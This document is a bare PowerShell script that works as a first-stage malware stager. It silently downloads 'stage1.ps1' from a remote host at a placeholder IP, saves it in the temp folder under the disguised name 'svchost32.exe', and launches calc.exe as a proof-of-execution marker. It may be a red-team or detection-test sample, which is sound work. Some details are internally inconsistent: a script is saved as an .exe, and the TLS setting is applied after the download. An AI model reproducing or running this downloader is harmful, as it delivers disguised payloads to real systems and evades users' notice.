
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://203.0.113.240:8080/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\svchost32.exe",
    [int]$RequestTimeout = 232
)
try { Invoke-WebRequest -Uri $TransferUrl -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
